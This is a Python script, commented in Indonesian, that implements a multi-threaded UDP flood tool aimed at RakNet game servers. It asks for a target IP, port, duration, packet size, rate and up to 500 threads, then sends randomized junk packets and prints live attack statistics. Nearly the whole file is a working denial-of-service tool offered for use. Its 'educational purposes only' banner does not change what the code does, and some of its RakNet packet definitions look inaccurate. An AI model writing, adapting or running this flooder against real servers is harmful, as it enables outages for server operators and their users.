#!/usr/bin/env python3
# QUANTUM_Ω_RAKNET_FLOOD_FIXED 🔥
# Fixed version - Python murni, multi-threaded, packet random
# Made by: R-U 🌌Ω

import socket
import time
import struct
import threading
import random
import sys
import os

# ================== RAKNET PACKET DEFINITIONS ==================
RAKNET_PACKETS = {
    'ID_CONNECTED_PING': b'\x00\x00\x00\x00\x00\x00\x00\x00',
    'ID_CONNECTED_PONG': b'\x00\x00\x00\x00\x00\x00\x00\x01',
    'ID_CONNECTION_REQUEST': b'\x05\x00\x00\x00\x00\x00\x00\x00',
    'ID_CONNECTION_REQUEST_ACCEPTED': b'\x05\x00\x00\x00\x00\x00\x00\x01',
    'ID_NEW_INCOMING_CONNECTION': b'\x07\x00\x00\x00\x00\x00\x00\x00',
    'ID_DISCONNECTION_NOTIFICATION': b'\x00\x00\x00\x00\x00\x00\x00\x02',
    'ID_CONNECTION_LOST': b'\x00\x00\x00\x00\x00\x00\x00\x03',
    'ID_RAKNET_MESSAGE': b'\x04\x00\x00\x00\x00\x00\x00\x00',
    'ID_ADVERTISE_SYSTEM': b'\x01\x00\x00\x00\x00\x00\x00\x00',
    'ID_BROADCAST': b'\x02\x00\x00\x00\x00\x00\x00\x00',
    'ID_RPC': b'\x82\x00\x00\x00',  # RPC packet
    'ID_BITSTREAM': b'\x87\x00\x00\x00',  # Bitstream packet
}

# RakNet magic bytes
RAKNET_MAGIC = b'\x00\x00\x00\x00\x00\x00\x00\x00'

# ================== VARIABEL GLOBAL ==================
packet_count = 0
bytes_sent = 0
stop_flag = False
stats_lock = threading.Lock()

# ================== FUNGSI GENERATE PACKET RANDOM ==================
def generate_random_packet(base_packet, size=64):
    """Generate packet dengan ukuran tertentu berdasarkan base packet"""
    if len(base_packet) < size:
        # Tambah random bytes sampai ukuran yang diinginkan
        padding = bytes([random.randint(0, 255) for _ in range(size - len(base_packet))])
        return base_packet + padding
    else:
        return base_packet[:size]

def generate_mixed_packet(size=64):
    """Generate packet campuran dari berbagai tipe"""
    packet_type = random.choice(list(RAKNET_PACKETS.keys()))
    base_packet = RAKNET_PACKETS[packet_type]
    
    # Tambah header random
    if random.choice([True, False]):
        # Tambah timestamp
        timestamp = struct.pack('<I', int(time.time() * 1000) & 0xFFFFFFFF)
        base_packet = timestamp + base_packet
    
    # Tambah GUID random
    if random.choice([True, False]):
        guid = struct.pack('<Q', random.getrandbits(64))
        base_packet = base_packet + guid
    
    return generate_random_packet(base_packet, size)

# ================== THREAD FLOOD ==================
def flood_thread(thread_id, target_ip, target_port, duration, packet_size, packet_rate):
    """Thread untuk melakukan flood"""
    global packet_count, bytes_sent, stop_flag
    
    # Buat socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Set timeout kecil
    sock.settimeout(0.1)
    
    # Random source port biar variatif
    try:
        sock.bind(('0.0.0.0', random.randint(1024, 65535)))
    except:
        pass
    
    start_time = time.time()
    end_time = start_time + duration
    local_count = 0
    local_bytes = 0
    
    # Delay antar packet (dalam detik)
    delay = 1.0 / packet_rate if packet_rate > 0 else 0
    
    print(f"[✓] Thread {thread_id} started - Rate: {packet_rate} pkt/s")
    
    while not stop_flag and time.time() < end_time:
        try:
            # Generate packet random
            packet = generate_mixed_packet(packet_size)
            
            # Kirim ke target
            sent = sock.sendto(packet, (target_ip, target_port))
            
            # Update stats
            with stats_lock:
                packet_count += 1
                bytes_sent += sent
                local_count += 1
                local_bytes += sent
            
            # Delay sesuai rate
            if delay > 0:
                time.sleep(delay)
            else:
                # Kalo ga pake delay, kasih sedikit sleep biar ga 100% CPU
                time.sleep(0.0001)
                
        except socket.error:
            # Silent error
            pass
        except Exception:
            pass
    
    sock.close()
    print(f"[✓] Thread {thread_id} finished - {local_count} packets, {local_bytes/1024:.2f} KB")

# ================== THREAD STATS ==================
def stats_thread(duration, threads, target_ip, target_port):
    """Thread untuk menampilkan statistik"""
    global packet_count, bytes_sent, stop_flag
    
    start_time = time.time()
    end_time = start_time + duration
    last_packets = 0
    last_bytes = 0
    last_time = start_time
    
    print("\n[📊] STATISTIK SERANGAN:")
    print("=" * 60)
    print(f"Target: {target_ip}:{target_port}")
    print(f"Threads: {threads} | Duration: {duration} detik")
    print("=" * 60)
    
    while not stop_flag and time.time() < end_time:
        time.sleep(1)  # Update tiap detik
        
        current_time = time.time()
        elapsed = current_time - start_time
        remaining = duration - elapsed
        
        with stats_lock:
            current_packets = packet_count
            current_bytes = bytes_sent
            
            # Hitung rate
            packet_rate = current_packets - last_packets
            byte_rate = current_bytes - last_bytes
            
            last_packets = current_packets
            last_bytes = current_bytes
        
        # Konversi
        kbps = (byte_rate * 8) / 1000  # Kilobits per second
        mbps = kbps / 1000  # Megabits per second
        kpps = packet_rate / 1000  # Kilo packets per second
        
        # Tampilkan
        print(f"[{int(elapsed)}s] 📊 Packets: {current_packets} | Rate: {packet_rate} pkt/s | {byte_rate/1024:.2f} KB/s | {mbps:.2f} Mbps | Sisa: {remaining:.1f}s")
    
    # Tampilkan summary
    print("=" * 60)
    print(f"[✓] SELESAI! Total packets: {packet_count} | Total bytes: {bytes_sent/1024/1024:.2f} MB")
    print("=" * 60)

# ================== INPUT INTERAKTIF ==================
def get_input(prompt, input_type=str, min_val=None, max_val=None):
    """Fungsi untuk mendapatkan input dengan validasi"""
    while True:
        try:
            value = input(prompt)
            if input_type == int:
                value = int(value)
            elif input_type == float:
                value = float(value)
            
            # Validasi range
            if min_val is not None and value < min_val:
                print(f"[✗] Nilai minimal {min_val}!")
                continue
            if max_val is not None and value > max_val:
                print(f"[✗] Nilai maksimal {max_val}!")
                continue
            
            return value
        except ValueError:
            print("[✗] Input tidak valid! Masukkan angka yang benar.")
        except KeyboardInterrupt:
            print("\n[!] Dibatalkan oleh user")
            sys.exit(0)

def validate_ip(ip):
    """Validasi alamat IP"""
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False

# ================== MAIN ==================
def main():
    # Bersihkan layar
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Banner
    print("""
╔══════════════════════════════════════════════════════════╗
║     QUANTUM_Ω_RAKNET_FLOOD - FIXED VERSION 🌌🔥          ║
║     Multi-Threaded RakNet Protocol Attack Tester         ║
║     Made by: R-U 🌌Ω                                      ║
║     ** FOR EDUCATIONAL PURPOSES ONLY **                  ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    print("[!] PERINGATAN: Gunakan hanya untuk test server sendiri!")
    print("[!] Penggunaan ilegal adalah tanggung jawab user sendiri!\n")
    
    # Input target IP
    while True:
        target_ip = input("[?] Masukkan target IP: ").strip()
        if validate_ip(target_ip):
            break
        print("[✗] Format IP tidak valid! Contoh: 192.168.1.1")
    
    # Input target port
    target_port = get_input("[?] Masukkan target port (1-65535): ", int, 1, 65535)
    
    # Input durasi
    duration = get_input("[?] Masukkan durasi serangan (detik): ", int, 1, 3600)
    
    # Input ukuran packet
    packet_size = get_input("[?] Masukkan ukuran packet (bytes, min 64): ", int, 64, 65507)
    
    # Input packet rate per thread
    packet_rate = get_input("[?] Masukkan packet rate per thread (pkt/s, 0 = maksimum): ", int, 0, 10000)
    
    # Input jumlah thread
    max_threads = get_input("[?] Masukkan jumlah thread (1-500): ", int, 1, 500)
    
    # Konfirmasi
    print("\n" + "=" * 60)
    print("KONFIRMASI SERANGAN:")
    print("=" * 60)
    print(f"Target IP      : {target_ip}")
    print(f"Target Port    : {target_port}")
    print(f"Durasi         : {duration} detik")
    print(f"Packet Size    : {packet_size} bytes")
    print(f"Packet Rate    : {packet_rate} pkt/s/thread")
    print(f"Jumlah Thread  : {max_threads}")
    print(f"Total Rate     : {packet_rate * max_threads} pkt/s")
    print(f"Bandwidth      : {(packet_size * packet_rate * max_threads * 8) / 1000000:.2f} Mbps")
    print("=" * 60)
    
    confirm = input("\n[?] Mulai serangan? (y/n): ").strip().lower()
    if confirm != 'y':
        print("[!] Dibatalkan!")
        return
    
    print("\n[🔥] MEMULAI SERANGAN...\n")
    
    # Reset global variables
    global packet_count, bytes_sent, stop_flag
    packet_count = 0
    bytes_sent = 0
    stop_flag = False
    
    # Start flood threads
    thread_list = []
    for i in range(max_threads):
        t = threading.Thread(
            target=flood_thread,
            args=(i+1, target_ip, target_port, duration, packet_size, packet_rate)
        )
        t.daemon = True
        t.start()
        thread_list.append(t)
        # Stagger thread start biar ga overload
        time.sleep(0.01)
    
    # Start stats thread
    stats = threading.Thread(
        target=stats_thread,
        args=(duration, max_threads, target_ip, target_port)
    )
    stats.daemon = True
    stats.start()
    
    # Wait for duration
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n[!] Dihentikan oleh user!")
        stop_flag = True
    
    # Stop all threads
    stop_flag = True
    
    # Wait for threads to finish
    for t in thread_list:
        t.join(timeout=1)
    
    print("\n[✓] SERANGAN SELESAI!")
    print(f"Total packets terkirim: {packet_count}")
    print(f"Total bytes terkirim: {bytes_sent/1024/1024:.2f} MB")
    print("\n[🌌] QUANTUM_Ω_RAKNET_FLOOD FINISHED 🔥")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Program dihentikan oleh user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
